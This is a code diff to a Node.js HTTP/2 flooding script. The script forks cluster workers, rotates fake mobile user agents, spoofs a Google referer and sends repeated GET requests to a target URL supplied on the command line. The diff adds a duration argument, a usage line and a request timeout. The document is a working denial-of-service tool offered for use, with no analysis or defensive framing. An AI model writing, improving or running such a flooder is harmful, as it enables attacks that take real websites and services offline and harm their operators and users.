@@ -2,9 +2,16 @@ const cluster = require("cluster")
 const https = require("https")
 const http = require("http")
 const fakeua = require("fake-useragent")
+const randomstring = require("randomstring")
 const http2 = require("http2")
 const target = process.argv[2]
 const thread = process.argv[3]
+const time = process.argv[4]
+const reqData = randomstring.generate(40)
+if ( process.argv.length < 5 ) {
+	console.log("Using: node http2 [target] [thread] [time]")
+	process.exit();
+}
 const useragent = [
     'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
@@ -2186,18 +2193,19 @@ const options = {
 	method: "GET",
 	path: "/",
 	globalAgent: agent,
+	timeout: 5000,
 	headers: {
 		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
 		"Connection": "keep-alive", 
-		"User-Agent": useragent2, 
-		"Referer": "https://www.google.com",
+		"user-agent": useragent2, 
+		"Referer": "http://www.google.com",
 	}
 }
 const client = http2.connect(target)
 function flood() {
 	const req = client.request(options)
 	req.on("response", () => {
-		req.destroy()
+		req.end()
 		return
 	})
 	req.on("error", () => {
@@ -2217,4 +2225,4 @@ if ( cluster.isWorker ) {
 		cluster.fork()
 	}
 }
-setTimeout(() => {}, 60000)
+setTimeout(() => {}, time * 1000)
